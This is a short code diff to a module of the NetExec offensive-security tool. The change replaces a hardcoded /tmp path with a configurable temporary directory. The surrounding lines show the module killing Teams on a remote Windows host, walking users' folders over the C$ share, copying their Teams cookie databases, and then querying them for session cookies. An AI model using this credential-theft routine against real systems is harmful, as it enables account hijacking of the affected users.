@@ -1,4 +1,6 @@
 import sqlite3
+from nxc.paths import TMP_PATH
+from os.path import abspath, join
 
 
 class NXCModule:
@@ -16,7 +18,7 @@ class NXCModule:
         connection.execute("taskkill /F /T /IM teams.exe")
         found = 0
         paths = connection.spider("C$", folder="Users", regex=["[a-zA-Z0-9]*"], depth=0)
-        with open("/tmp/teams_cookies2.txt", "wb") as f:
+        with open(abspath(join(TMP_PATH, "teams_cookies2.txt")), "wb") as f:
             for path in paths:
                 try:
                     connection.conn.getFile("C$", path + "/AppData/Roaming/Microsoft/Teams/Cookies", f.write)
@@ -37,7 +39,7 @@ class NXCModule:
     @staticmethod
     def parse_file(context, name):
         try:
-            conn = sqlite3.connect("/tmp/teams_cookies2.txt")
+            conn = sqlite3.connect(abspath(join(TMP_PATH, "teams_cookies2.txt")))
             c = conn.cursor()
             c.execute("SELECT value FROM cookies WHERE name = '" + name + "'")
             row = c.fetchone()
